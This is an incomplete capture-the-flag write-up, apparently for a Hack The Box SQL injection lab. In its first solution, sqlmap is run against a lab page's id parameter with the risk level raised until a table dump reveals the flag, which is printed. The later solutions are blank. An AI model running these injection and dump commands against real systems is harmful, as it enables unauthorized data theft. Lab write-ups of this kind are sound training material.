## Challenge 1

What's the contents of table flag5? (Case #5)

## Solution 1

On the page, I clicked hte Case5, and there was a link to click with the description to detect and exploit the vulnerability in GET parameter id.

That send me to the following link: `http://83.136.255.180:53163/case5.php?id=1`.

I started the SQLmap with the following command:

```sh
python3 sqlmap.py "http://83.136.255.180:53163/case5.php?id=1"
```

and this didn't produce any result, so since it needs `OR`, I will increase the risk level to 2.

```sh
python3 sqlmap.py "http://83.136.255.180:53163/case5.php?id=1" --risk=2
```
This again didn't bring any result, so I will now set the risk to 3.

```sh
python3 sqlmap.py "http://83.136.255.180:53163/case5.php?id=1" --risk=3 --dump
```

and I got the flag, which is:

```sh
+----+---------------------------------+
| id | content                         |
+----+---------------------------------+
| 1  | HTB{700_much_r15k_bu7_w0r7h_17} |
+----+---------------------------------+
```

## Challenge 2

What's the contents of table flag6? (Case #6)

## Solution 2

## Challenge 3

What's the contents of table flag7? (Case #7)

## Solution 3